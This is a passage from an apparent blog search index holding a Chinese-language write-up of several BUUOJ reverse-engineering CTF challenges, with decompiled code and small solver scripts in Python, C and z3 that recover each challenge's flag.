","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:29","tags":["assembly"],"title":"8086CPU汇编","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["WriteUps"],"content":"buuoj re wp ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:0:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"CrackRTF ida定位main函数F5 int __cdecl main_0(int argc, const char **argv, const char **envp) { DWORD v3; // eax DWORD v4; // eax char Str[260]; // [esp+4Ch] [ebp-310h] BYREF int v7; // [esp+150h] [ebp-20Ch] char String1[260]; // [esp+154h] [ebp-208h] BYREF char Destination[260]; // [esp+258h] [ebp-104h] BYREF memset(Destination, 0, sizeof(Destination)); memset(String1, 0, sizeof(String1)); v7 = 0; printf(\"pls input the first passwd(1): \"); scanf(\"%s\", Destination); if ( strlen(Destination) != 6 ) { printf(\"Must be 6 characters!\\n\"); ExitProcess(0); } v7 = atoi(Destination); // atoi是把字符串形式的数字转化为数字，可确定6位数字密码，即可爆破 if ( v7 \u003c 100000 ) ExitProcess(0); strcat(Destination, \"@DBApp\"); v3 = strlen(Destination); sub_40100A((BYTE *)Destination, v3, String1); // 动调测试可知为sha1加密，爆破拿前6位密码 if ( !_strcmpi(String1, \"6E32D0943418C2C33385BC35A1470250DD8923A9\") ) { printf(\"continue...\\n\\n\"); printf(\"pls input the first passwd(2): \"); memset(Str, 0, sizeof(Str)); scanf(\"%s\", Str); if ( strlen(Str) != 6 ) { printf(\"Must be 6 characters!\\n\"); ExitProcess(0); } strcat(Str, Destination); memset(String1, 0, sizeof(String1)); v4 = strlen(Str); sub_401019((BYTE *)Str, v4, String1); // 动调测试得知为md5,但爆破6位全字符不现实，密码无法从这获得 if ( !_strcmpi(\"27019e688a4e62a649fd99cadaafdb4e\", String1) ) { if ( !(unsigned __int8)sub_40100F(Str) ) { printf(\"Error!!\\n\"); ExitProcess(0); } printf(\"bye ~~\\n\"); } } return 0; } 题目需要输入两次密码，分别经加密函数后与已知字符串比较 第一次加密 加密前atoi函数作用是把string形式的数字转化为int类型的数字，提示前6位密码为6位数字 sub_40100A是第一个加密函数，内部调用了windows库的加密函数，可以通过查看windows官方文档辨别参数得知为sha1加密，我这里是用动调对比在线加密网站加密结果确定加密算法为sha1 //sub_40100A内部嵌套sub_401230函数 int __cdecl sub_401230(BYTE *pbData, DWORD dwDataLen, LPSTR lpString1) { int result; // eax DWORD i; // [esp+4Ch] [ebp-28h] CHAR String2[4]; // [esp+50h] [ebp-24h] BYREF BYTE v6[20]; // [esp+54h] [ebp-20h] BYREF DWORD pdwDataLen; // [esp+68h] [ebp-Ch] BYREF HCRYPTHASH phHash; // [esp+6Ch] [ebp-8h] BYREF HCRYPTPROV phProv; // [esp+70h] [ebp-4h] BYREF if ( !CryptAcquireContextA(\u0026phProv, 0, 0, 1u, 0xF0000000) ) return 0; if ( CryptCreateHash(phProv, 0x8004u, 0, 0, \u0026phHash) ) { if ( CryptHashData(phHash, pbData, dwDataLen, 0) ) { CryptGetHashParam(phHash, 2u, v6, \u0026pdwDataLen, 0); *lpString1 = 0; for ( i = 0; i \u003c pdwDataLen; ++i ) { wsprintfA(String2, \"%02X\", v6[i]); lstrcatA(lpString1, String2); } CryptDestroyHash(phHash); CryptReleaseContext(phProv, 0); result = 1; } else { CryptDestroyHash(phHash); CryptReleaseContext(phProv, 0); result = 0; } } else { CryptReleaseContext(phProv, 0); result = 0; } return result; } sha1是单向散列函数，没法逆，幸好是6位数字，直接爆破拿到密码123321 import hashlib for i in range(100000,999999): sha1 = hashlib.sha1() inp = str(i) + \"@DBApp\" sha1.update(inp.encode(\"utf-8\")) if sha1.hexdigest().lower() == \"6E32D0943418C2C33385BC35A1470250DD8923A9\".lower(): print(i) # output：123321 同理第二个加密算法可知为md5，但没有限定为数字，试了试6位数字爆破没有结果，6位全字符爆破不现实 继续往下看sub_40100F传参调用了输入的str //sub_40100F中嵌套了sub_4014D0 char __cdecl sub_4014D0(LPCSTR lpString) { LPCVOID lpBuffer; // [esp+50h] [ebp-1Ch] DWORD NumberOfBytesWritten; // [esp+58h] [ebp-14h] BYREF DWORD nNumberOfBytesToWrite; // [esp+5Ch] [ebp-10h] HGLOBAL hResData; // [esp+60h] [ebp-Ch] HRSRC hResInfo; // [esp+64h] [ebp-8h] HANDLE hFile; // [esp+68h] [ebp-4h] hFile = 0; hResData = 0; nNumberOfBytesToWrite = 0; NumberOfBytesWritten = 0; hResInfo = FindResourceA(0, (LPCSTR)0x65, \"AAA\");// Resource-Hacker看资源 if ( !hResInfo ) return 0; nNumberOfBytesToWrite = SizeofResource(0, hResInfo); hResData = LoadResource(0, hResInfo); if ( !hResData ) return 0; lpBuffer = LockResource(hResData); sub_401005(lpString, (int)lpBuffer, nNumberOfBytesToWrite);// 和lpString异或得到lpbuffer hFile = CreateFileA(\"dbapp.rtf\", 0x10000000u, 0, 0, 2u, 0x80u, 0); if ( hFile == (HANDLE)-1 ) return 0; if ( !WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, \u0026NumberOfBytesWritten, 0) ) return 0; CloseHandle(hFile); return 1; } sub_401005函数内部进行逐位异或 //sub_401005内部嵌套sub_401420 void __cdecl sub_401420(LPCSTR lpString, char *_8, int _C) { unsigned int i; // [esp+4Ch] [ebp-Ch] unsig","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:1:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"[2019红帽杯]easyRE 参考官方wp，这真是道眼力题。。 进ida，首先看到start函数，啥也不是，翻string窗口，很显眼的You found me，跟进去 __int64 sub_4009C6() { __int64 result; // rax int i; // [rsp+Ch] [rbp-114h] __int64 v2; // [rsp+10h] [rbp-110h] __int64 v3; // [rsp+18h] [rbp-108h] __int64 v4; // [rsp+20h] [rbp-100h] __int64 v5; // [rsp+28h] [rbp-F8h] __int64 v6; // [rsp+30h] [rbp-F0h] __int64 v7; // [rsp+38h] [rbp-E8h] __int64 v8; // [rsp+40h] [rbp-E0h] __int64 v9; // [rsp+48h] [rbp-D8h] __int64 v10; // [rsp+50h] [rbp-D0h] __int64 v11; // [rsp+58h] [rbp-C8h] char v12[36]; // [rsp+60h] [rbp-C0h] BYREF char input1[32]; // [rsp+90h] [rbp-90h] BYREF int v14; // [rsp+B0h] [rbp-70h] char v15; // [rsp+B4h] [rbp-6Ch] char input2[72]; // [rsp+C0h] [rbp-60h] BYREF unsigned __int64 v17; // [rsp+108h] [rbp-18h] v17 = __readfsqword(0x28u); qmemcpy(v12, \"Iodl\u003eQnb(ocy\", 12); v12[12] = 127; qmemcpy(\u0026v12[13], \"y.i\", 3); v12[16] = 127; qmemcpy(\u0026v12[17], \"d`3w}wek9{iy=~yL@EC\", 19); memset(input1, 0, sizeof(input1)); v14 = 0; v15 = 0; Read(0, input1, 0x25uLL); v15 = 0; if ( _strlen_sse2(input1) == 36 ) { for ( i = 0; i \u003c (unsigned __int64)_strlen_sse2(input1); ++i ) { if ( (unsigned __int8)(input1[i] ^ i) != v12[i] ) { result = 4294967294LL; goto LABEL_13; } } puts(\"continue!\"); memset(input2, 0, 0x40uLL); input2[64] = 0; Read(0, input2, 0x40uLL); input2[39] = 0; if ( _strlen_sse2(input2) == 39 ) { v2 = Base64enc(input2); v3 = Base64enc(v2); v4 = Base64enc(v3); v5 = Base64enc(v4); v6 = Base64enc(v5); v7 = Base64enc(v6); v8 = Base64enc(v7); v9 = Base64enc(v8); v10 = Base64enc(v9); v11 = Base64enc(v10); if ( !(unsigned int)Strcmp(v11, off_6CC090) ) { puts(\"You found me!!!\"); puts(\"bye bye~\"); } result = 0LL; } else { result = 4294967293LL; } } else { result = 0xFFFFFFFFLL; } LABEL_13: if ( __readfsqword(0x28u) != v17 ) sub_444020(); return result; } 两次输入，两次加密比较，都很常规 第一个异或解密 enc1 = \"Iodl\u003eQnb(ocy\" + chr(127) + \"y.i\" + chr(127) + \"d`3w}wek9{iy=~yL@EC\" print(len(enc1)) for i in range(36): print(chr(ord(enc1[i]) ^ i),end=\"\") #output： Info:The first four chars are `flag` 第二个可以看出来是base64加密了10遍，解密得到https://bbs.pediy.com/thread-254172.htm，然后寄！ 翻各种奇奇怪怪的系统函数实现，也没看出来个所以然，看了看wp,其实上面文章中也有提示，但我也没认真看（（ 在第二次加密后比较的字符串位置后面，还存着一个规律的字符串 查交叉引用定位函数sub_400D35 unsigned __int64 sub_400D35() { unsigned __int64 result; // rax unsigned int v1; // [rsp+Ch] [rbp-24h] int i; // [rsp+10h] [rbp-20h] int j; // [rsp+14h] [rbp-1Ch] unsigned int key; // [rsp+24h] [rbp-Ch] unsigned __int64 v5; // [rsp+28h] [rbp-8h] v5 = __readfsqword(0x28u); v1 = sub_43FD20(0LL) - qword_6CEE38; for ( i = 0; i \u003c= 1233; ++i ) { sub_40F790(v1); sub_40FE60(); sub_40FE60(); v1 = sub_40FE60() ^ 0x98765432; } key = v1; if ( ((unsigned __int8)v1 ^ a5VENbThlNr2e[0]) == 'f' \u0026\u0026 (HIBYTE(key) ^ a5VENbThlNr2e[3]) == 'g' ) { for ( j = 0; j \u003c= 24; ++j ) putchar((unsigned __int8)(a5VENbThlNr2e[j] ^ *((_BYTE *)\u0026key + j % 4))); } result = __readfsqword(0x28u) ^ v5; if ( result ) sub_444020(); return result; } 第一次异或得到前四位为flag，第二次异或输出flag en_flag = [0x40, 0x35, 0x20, 0x56, 0x5D, 0x18, 0x22, 0x45, 0x17, 0x2F, 0x24, 0x6E, 0x62, 0x3C, 0x27, 0x54, 0x48, 0x6C, 0x24, 0x6E, 0x72, 0x3C, 0x32, 0x45, 0x5B, 0x00] chars = \"flag\" key = [0]*4 for i in range(4): key[i] = en_flag[i] ^ ord(chars[i]) for i in range(26): print(chr(en_flag[i] ^ key[i%4]),end=\"\") #output：flag{Act1ve_Defen5e_Test} ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:2:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"[FlareOn4]login 解压压缩包得到一个html文件，源码如下 \u003c!DOCTYPE Html /\u003e \u003chtml\u003e \u003chead\u003e \u003ctitle\u003eFLARE On 2017\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cinput type=\"text\" name=\"flag\" id=\"flag\" value=\"Enter the flag\" /\u003e \u003cinput type=\"button\" id=\"prompt\" value=\"Click to check the flag\" /\u003e \u003cscript type=\"text/javascript\"\u003e document.getElementById(\"prompt\").onclick = function () { var flag = document.getElementById(\"flag\").value; var rotFlag = flag.replace(/[a-zA-Z]/g, function(c){return String.fromCharCode((c \u003c= \"Z\" ? 90 : 122) \u003e= (c = c.charCodeAt(0) + 13) ? c : c - 26);}); if (\"PyvragFvqrYbtvafNerRnfl@syner-ba.pbz\" == rotFlag) { alert(\"Correct flag!\"); } else { alert(\"Incorrect flag, rot again\"); } } \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e 计算rotFlag属于是极致的压行了，为的就是让人迷糊看不懂，翻译成py大概长这样 flag = \"plain_text\" for i in range(36): if(flag[i] \u003c= \"Z\"): t = 90 else: t = 122 flag[i] = chr(ord(flag[i]) + 13) if(t \u003c flag[i]): flag[i] -= 26 flag所有位会先加上13，然后如果符合if条件会再减26 要想完全理清楚一位一位逆回去很麻烦，但总的来说逆回去要么加13要么减13 盲猜flag是有意义的字符串，所以我把可能的情况全列出来（一位两种可能），人工挑选正确答案 en_flag = \"PyvragFvqrYbtvafNerRnfl@syner-ba.pbz\" for i in en_flag: if(i.isalpha() == False):#只替换flag中的字母 print(i) continue if(ord(i)+ 13 \u003c= 126):#加这个判断是因为如果超出可见字符，无法输出则排列会很难看 print(chr(ord(i)+13),end=\" \") print(chr(ord(i)-13)) 程序输出 ] C l i e n T t Z S 9 i ~ d e f L o U g i n T s Y [ A r X e _ E { a s Y y _ @ f l { a r X e - o U n T . } c o U m 其中如果某一行既有字母又有非字母，可以直接舍弃非字母，因为非字母开始就不会被替换 仔细看一会，得到flag{ClientSideLoginsAreEasy@flare-on.com} ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:3:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"[GUET-CTF2019]re 拖入ida发现函数很少，感觉有壳，果然是upx，先脱壳然后再进ida 主要函数 __int64 __fastcall sub_400E28(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6) { __int64 result; // rax __int64 v7; // [rsp+0h] [rbp-30h] BYREF unsigned __int64 v8; // [rsp+28h] [rbp-8h] v8 = __readfsqword(0x28u); Printf((__int64)\"input your flag:\", a2, a3, a4, a5, a6, 0LL, 0LL, 0LL, 0LL); Scanf((__int64)\"%s\", \u0026v7); if ( sub_4009AE((char *)\u0026v7) ) puts(\"Correct!\"); else puts(\"Wrong!\"); result = 0LL; if ( __readfsqword(0x28u) != v8 ) sub_443550(); return result; } 主要加密在sub_4009AE _BOOL8 __fastcall sub_4009AE(char *a1) { if ( 1629056 * *a1 != 166163712 ) return 0LL; if ( 6771600 * a1[1] != 731332800 ) return 0LL; if ( 3682944 * a1[2] != 357245568 ) return 0LL; if ( 10431000 * a1[3] != 1074393000 ) return 0LL; if ( 3977328 * a1[4] != 489211344 ) return 0LL; if ( 5138336 * a1[5] != 518971936 ) return 0LL; if ( 7532250 * a1[7] != 406741500 ) return 0LL; if ( 5551632 * a1[8] != 294236496 ) return 0LL; if ( 3409728 * a1[9] != 177305856 ) return 0LL; if ( 13013670 * a1[10] != 650683500 ) return 0LL; if ( 6088797 * a1[11] != 298351053 ) return 0LL; if ( 7884663 * a1[12] != 386348487 ) return 0LL; if ( 8944053 * a1[13] != 438258597 ) return 0LL; if ( 5198490 * a1[14] != 249527520 ) return 0LL; if ( 4544518 * a1[15] != 445362764 ) return 0LL; if ( 3645600 * a1[17] != 174988800 ) return 0LL; if ( 10115280 * a1[16] != 981182160 ) return 0LL; if ( 9667504 * a1[18] != 493042704 ) return 0LL; if ( 5364450 * a1[19] != 257493600 ) return 0LL; if ( 13464540 * a1[20] != 767478780 ) return 0LL; if ( 5488432 * a1[21] != 312840624 ) return 0LL; if ( 14479500 * a1[22] != 1404511500 ) return 0LL; if ( 6451830 * a1[23] != 316139670 ) return 0LL; if ( 6252576 * a1[24] != 619005024 ) return 0LL; if ( 7763364 * a1[25] != 372641472 ) return 0LL; if ( 7327320 * a1[26] != 373693320 ) return 0LL; if ( 8741520 * a1[27] != 498266640 ) return 0LL; if ( 8871876 * a1[28] != 452465676 ) return 0LL; if ( 4086720 * a1[29] != 208422720 ) return 0LL; if ( 9374400 * a1[30] == 515592000 ) return 5759124 * a1[31] == 719890500; return 0LL; } 上z3搞它 from z3 import * s = z3.Solver() a1 = [Int('a1[%d]' % i) for i in range(32)] s.add(1629056 * a1[0] == 166163712) s.add(6771600 * a1[1] == 731332800) s.add(3682944 * a1[2] == 357245568) s.add(10431000 * a1[3] == 1074393000) s.add(3977328 * a1[4] == 489211344) s.add(5138336 * a1[5] == 518971936) s.add(7532250 * a1[7] == 406741500) s.add(5551632 * a1[8] == 294236496) s.add(3409728 * a1[9] == 177305856) s.add(13013670 * a1[10] == 650683500) s.add(6088797 * a1[11] == 298351053) s.add(7884663 * a1[12] == 386348487) s.add(8944053 * a1[13] == 438258597) s.add(5198490 * a1[14] == 249527520) s.add(4544518 * a1[15] == 445362764) s.add(3645600 * a1[17] == 174988800) s.add(10115280 * a1[16] == 981182160) s.add(9667504 * a1[18] == 493042704) s.add(5364450 * a1[19] == 257493600) s.add(13464540 * a1[20] == 767478780) s.add(5488432 * a1[21] == 312840624) s.add(14479500 * a1[22] == 1404511500) s.add(6451830 * a1[23] == 316139670) s.add(6252576 * a1[24] == 619005024) s.add(7763364 * a1[25] == 372641472) s.add(7327320 * a1[26] == 373693320) s.add(8741520 * a1[27] == 498266640) s.add(8871876 * a1[28] == 452465676) s.add(4086720 * a1[29] == 208422720) s.add(9374400 * a1[30] == 515592000) s.add(5759124 * a1[31] == 719890500) s.check() print(s.model()) 打印flag a1 = [0] * 32 a1[31] = 125 a1[30] = 55 a1[29] = 51 a1[28] = 51 a1[27] = 57 a1[26] = 51 a1[25] = 48 a1[24] = 99 a1[23] = 49 a1[22] = 97 a1[21] = 57 a1[20] = 57 a1[19] = 48 a1[18] = 51 a1[16] = 97 a1[17] = 48 a1[15] = 98 a1[14] = 48 a1[13] = 49 a1[12] = 49 a1[11] = 49 a1[10] = 50 a1[9] = 52 a1[8] = 53 a1[7] = 54 a1[5] = 101 a1[4] = 123 a1[3] = 103 a1[2] = 97 a1[1] = 108 a1[0] = 102 for i in range(32): print(chr(a1[i]),end=\"\") 这里有两个小问题 伪代码中16、17两位顺序反了，但因为z3搞的时候是顺着命名未知数的，所以反上加反等于顺序正确，不用修改 另一点就是第6位缺失，并未进行判断，实测无论第6位是什么，源程序都会输出Correct！，应该是多解，但无奈buu平台上只认第6位为1 故flag{e165421110ba03099a1c039337} ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:4:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"[SUCTF2019]SignIn 进ida看到main函数 __int64 __fastcall main(int a1, char **a2, char **a3) { char v4[16]; // [rsp+0h] [rbp-4A0h] BYREF char v5[16]; // [rsp+10h] [rbp-490h] BYREF char v6[16]; // [rsp+20h] [rbp-480h] BYREF char code[16]; // [rsp+30h] [rbp-470h] BYREF char v8[112]; // [rsp+40h] [rbp-460h] BYREF char v9[1000]; // [rsp+B0h] [rbp-3F0h] BYREF unsigned __int64 v10; // [rsp+498h] [rbp-8h] v10 = __readfsqword(0x28u); puts(\"[sign in]\"); printf(\"[input your flag]: \"); __isoc99_scanf(\"%99s\", v8); sub_96A(v8, v9); __gmpz_init_set_str(code, \"ad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35\", 16LL); __gmpz_init_set_str(v6, v9, 16LL); __gmpz_init_set_str(v4, \"103461035900816914121390101299049044413950405173712170434161686539878160984549\", 10LL); __gmpz_init_set_str(v5, \"65537\", 10LL); __gmpz_powm(v6, v6, v5, v4); if ( (unsigned int)__gmpz_cmp(v6, code) ) puts(\"GG!\"); else puts(\"TTTTTTTTTTql!\"); return 0LL; } 标准的用gmp库实现的RSA算法 参考gmpy2常见函数使用 RSA算法原理 利用gmpy2库解出flag import gmpy2 from Crypto.Util.number import * n = 103461035900816914121390101299049044413950405173712170434161686539878160984549 p = 282164587459512124844245113950593348271 q = 366669102002966856876605669837014229419 code = 0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35 e = 65537 l = (p-1)*(q-1) d = gmpy2.invert(e,l) flag = gmpy2.powmod(code,d,n) print(long_to_bytes(flag)) #output：b'suctf{Pwn_@_hundred_years}' ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:6:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"[WUSTCTF2020]level1 main函数 int __cdecl main(int argc, const char **argv, const char **envp) { int i; // [rsp+4h] [rbp-2Ch] FILE *stream; // [rsp+8h] [rbp-28h] char ptr[24]; // [rsp+10h] [rbp-20h] BYREF unsigned __int64 v7; // [rsp+28h] [rbp-8h] v7 = __readfsqword(0x28u); stream = fopen(\"flag\", \"r\"); fread(ptr, 1uLL, 0x14uLL, stream); fclose(stream); for ( i = 1; i \u003c= 19; ++i ) { if ( (i \u0026 1) != 0 ) printf(\"%ld\\n\", (unsigned int)(ptr[i] \u003c\u003c i)); else printf(\"%ld\\n\", (unsigned int)(i * ptr[i])); } return 0; } 有强转直接逆不太保险，正着直接爆出来 #include\u003cstdio.h\u003e int main(){ unsigned int en_flag[] = {0,198,232,816,200,1536,300,6144,984,51200,570,92160,1200,565248,756,1474560,800,6291456,1782,65536000}; char flag[19] = {0}; for(int i = 1;i \u003c= 19; i++){ for(int j = 32; j \u003c= 126; j++){ unsigned int t; if(i \u0026 1 != 0) t = (unsigned int)(j \u003c\u003c i); else t = (unsigned int)(j * i); if(t == en_flag[i]) flag[i] = j; } printf(\"%c\",flag[i]); } } //output：ctf2020{d9-dE6-20c} （这两天题咋越做越简单了，， ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:7:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"[MRCTF2020]Transform 进ida就能看到main函数，简单改一下变量名 int __cdecl main(int argc, const char **argv, const char **envp) { char Str[104]; // [rsp+20h] [rbp-70h] BYREF int j; // [rsp+88h] [rbp-8h] int i; // [rsp+8Ch] [rbp-4h] sub_402230(argc, argv, envp); Printf(\"Give me your code:\\n\"); Scanf(\"%s\", Str); if ( strlen(Str) != 33 ) { Printf(\"Wrong!\\n\"); system(\"pause\"); exit(0); } for ( i = 0; i \u003c= 32; ++i ) { en_flag[i] = Str[index[i]]; en_flag[i] ^= LOBYTE(index[i]); } for ( j = 0; j \u003c= 32; ++j ) { if ( byte_40F0E0[j] != en_flag[j] ) { Printf(\"Wrong!\\n\"); system(\"pause\"); exit(0); } } Printf(\"Right!Good Job!\\n\"); Printf(\"Here is your flag: %s\\n\", Str); system(\"pause\"); return 0; } 直接逆拿flag index = [ 0x09, 0x0A, 0x0F, 0x17, 0x07, 0x18, 0x0C, 0x06, 0x01, 0x10, 0x03, 0x11, 0x20, 0x1D, 0x0B, 0x1E, 0x1B, 0x16, 0x04, 0x0D, 0x13, 0x14, 0x15, 0x02, 0x19, 0x05, 0x1F, 0x08, 0x12, 0x1A, 0x1C, 0x0E,0] en_flag = [ 0x67, 0x79, 0x7B, 0x7F, 0x75, 0x2B, 0x3C, 0x52, 0x53, 0x79, 0x57, 0x5E, 0x5D, 0x42, 0x7B, 0x2D, 0x2A, 0x66, 0x42, 0x7E, 0x4C, 0x57, 0x79, 0x41, 0x6B, 0x7E, 0x65, 0x3C, 0x5C, 0x45, 0x6F, 0x62, 0x4D] flag = [0] * 33 for i in range(0,33): en_flag[i] ^= index[i] flag[index[i]] = en_flag[i] for i in flag: print(chr(i), end = \"\") #output：MRCTF{Tr4nsp0sltiON_Clph3r_1s_3z} ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:8:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"[ACTF新生赛2020]usualCrypt 进ida看main函数 int __cdecl main(int argc, const char **argv, const char **envp) { int v3; // esi int result; // eax int v5[3]; // [esp+8h] [ebp-74h] BYREF __int16 v6; // [esp+14h] [ebp-68h] char v7; // [esp+16h] [ebp-66h] char v8[100]; // [esp+18h] [ebp-64h] BYREF printf(asc_40E140); scanf(\"%s\", v8); v5[0] = 0; v5[1] = 0; v5[2] = 0; v6 = 0; v7 = 0; encrypt((int)v8, strlen(v8), (int)v5); v3 = 0; while ( *((_BYTE *)v5 + v3) == enc[v3] ) { if ( ++v3 \u003e strlen((const char *)v5) ) goto LABEL_6; } printf(\"error!\\n\"); LABEL_6: if ( v3 - 1 == strlen(enc) ) result = printf(\"Are you happy?yes!\\n\"); else result = printf(\"Are you happy?No!\\n\"); return result; } encrypt函数 void __cdecl encrypt(int a1, int a2, int a3) { int v3; // edi int v4; // esi int v5; // edx int v6; // eax int v7; // ecx int v8; // esi int v9; // esi int v10; // esi int v11; // esi _BYTE *v12; // ecx int v13; // esi int a2a; // [esp+18h] [ebp+8h] v3 = 0; v4 = 0; changeTable(); // base64换表 v5 = a2 % 3; v6 = a1; v7 = a2 - a2 % 3; a2a = a2 % 3; if ( v7 \u003e 0 ) { do { LOBYTE(v5) = *(_BYTE *)(a1 + v3); v3 += 3; v8 = v4 + 1; *(_BYTE *)(v8 + a3 - 1) = aAbcdefghijklmn[(v5 \u003e\u003e 2) \u0026 0x3F]; *(_BYTE *)(++v8 + a3 - 1) = aAbcdefghijklmn[16 * (*(_BYTE *)(a1 + v3 - 3) \u0026 3) + (((int)*(unsigned __int8 *)(a1 + v3 - 2) \u003e\u003e 4) \u0026 0xF)]; *(_BYTE *)(++v8 + a3 - 1) = aAbcdefghijklmn[4 * (*(_BYTE *)(a1 + v3 - 2) \u0026 0xF) + (((int)*(unsigned __int8 *)(a1 + v3 - 1) \u003e\u003e 6) \u0026 3)]; v5 = *(_BYTE *)(a1 + v3 - 1) \u0026 0x3F; v4 = v8 + 1; *(_BYTE *)(v4 + a3 - 1) = aAbcdefghijklmn[v5]; } while ( v3 \u003c v7 ); v5 = a2a; } if ( v5 == 1 ) { LOBYTE(v7) = *(_BYTE *)(v3 + a1); v9 = v4 + 1; *(_BYTE *)(v9 + a3 - 1) = aAbcdefghijklmn[(v7 \u003e\u003e 2) \u0026 0x3F]; v10 = v9 + 1; *(_BYTE *)(v10 + a3 - 1) = aAbcdefghijklmn[16 * (*(_BYTE *)(v3 + a1) \u0026 3)]; *(_BYTE *)(v10 + a3) = 61; LABEL_8: v13 = v10 + 1; *(_BYTE *)(v13 + a3) = 61; v4 = v13 + 1; goto LABEL_9; } if ( v5 == 2 ) { v11 = v4 + 1; *(_BYTE *)(v11 + a3 - 1) = aAbcdefghijklmn[((int)*(unsigned __int8 *)(v3 + a1) \u003e\u003e 2) \u0026 0x3F]; v12 = (_BYTE *)(v3 + a1 + 1); LOBYTE(v6) = *v12; v10 = v11 + 1; *(_BYTE *)(v10 + a3 - 1) = aAbcdefghijklmn[16 * (*(_BYTE *)(v3 + a1) \u0026 3) + ((v6 \u003e\u003e 4) \u0026 0xF)]; *(_BYTE *)(v10 + a3) = aAbcdefghijklmn[4 * (*v12 \u0026 0xF)]; goto LABEL_8; } LABEL_9: *(_BYTE *)(v4 + a3) = 0; switch((const char *)a3); // 大小写转换 } 出题人在寒顺的开头和结尾耍了一点小心思 上面先简单的换了个base64的表，下面把base64编码后的字符串中的字母进行大小写转换 最终得到的字符串与已知字符串比较 写脚本拿flag import base64 enc = \"zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9\" ch = \"\" for i in enc: if(ord(i) \u003c 97 or ord(i) \u003e 122): if(ord(i) \u003c 65 or ord(i) \u003e 90): ch += i continue ch += chr(ord(i) + 32) else: ch += chr(ord(i) - 32) old_table = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\" new_table = \"ABCDEFQRSTUVWXYPGHIJKLMNOZabcdefghijklmnopqrstuvwxyz0123456789+/\" table = str.maketrans(old_table, new_table) print(base64.b64decode(ch.translate(table))) #output：b'flag{bAse64_h2s_a_Surprise}' ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:9:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"Youngter-drive 参考g0ul4sh的wp，大佬写得很详细，学到很多 总的来说，这是一道很有意思的题 先要脱upx壳，然后拖进ida，main函数 int __cdecl main_0(int argc, const char **argv, const char **envp) { void *v3; // ecx HANDLE v5; // [esp+D0h] [ebp-14h] HANDLE hObject; // [esp+DCh] [ebp-8h] ini(v3); ::hObject = CreateMutexW(0, 0, 0); j_strcpy(Destination, (const char *)Source); hObject = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, 0, 0, 0); v5 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_41119F, 0, 0, 0); CloseHandle(hObject); CloseHandle(v5); while ( dword_418008 != -1 ) ; sub_411190(); CloseHandle(::hObject); return 0; } CreateThread API 会创建新线程，这道题涉及到多线程。CreateMutex 创建一个互斥体，用于防止多线程中出现资源争用，即多个线程同时读写同一个资源的情况，所创建的互斥体的句柄会存到全局变量 hObject 中（注意前面的两个冒号表示是全局变量，而不是这个函数里同名的局部变量）。这里创建了两个线程，入口点分别位于函数 StartAddress 和 sub_41119F StartAddress线程内部函数 void __stdcall StartAddress_0(int a1) { while ( 1 ) { WaitForSingleObject(hObject, 0xFFFFFFFF); if ( dword_418008 \u003e -1 ) { sub_41112C((int)Source, (char *)dword_418008); --dword_418008; Sleep(0x64u); } ReleaseMutex(hObject); } } //sub_41112C内部嵌套sub_411940 void __cdecl sub_411940(int a1, char *a2) { char v2; // [esp+D3h] [ebp-5h] v2 = a2[a1]; if ( (v2 \u003c 'a' || v2 \u003e 'z') \u0026\u0026 (v2 \u003c 'A' || v2 \u003e 'Z') ) exit(0); if ( v2 \u003c 'a' || v2 \u003e 'z' ) a2[a1] = off_418000[0][a2[a1] - 38]; else a2[a1] = off_418000[0][a2[a1] - 96]; } 这里发现个小问题，通过函数实现判断sub__41112C函数和内部sub_411940函数参数顺序颠倒，猜测是stdcall和cdecl传参顺序不同引起的，但ida识别错误 sub_41119F线程内部函数 void __stdcall sub_411B10(int a1) { while ( 1 ) { WaitForSingleObject(hObject, 0xFFFFFFFF); if ( dword_418008 \u003e -1 ) { Sleep(0x64u); --dword_418008; } ReleaseMutex(hObject); } } 自己做的时候不懂多线程，以为这个函数没啥用，导致卡死 查 MSDN 知，可以用 WaitForSingleObject 等待互斥体的使用权（ownership）空闲出来，并获取使用权，然后再访问和其他线程共享的资源，访问完后，用 ReleaseMutex 释放使用权，给其他线程使用的机会4。通过比较两线程的函数，很容易知道所共享的资源就是全局变量 dword_418008，它的初值是 29。而这两个线程一前一后创建，理论上是 StartAddress 先获得使用权，后来的 sub_41119F 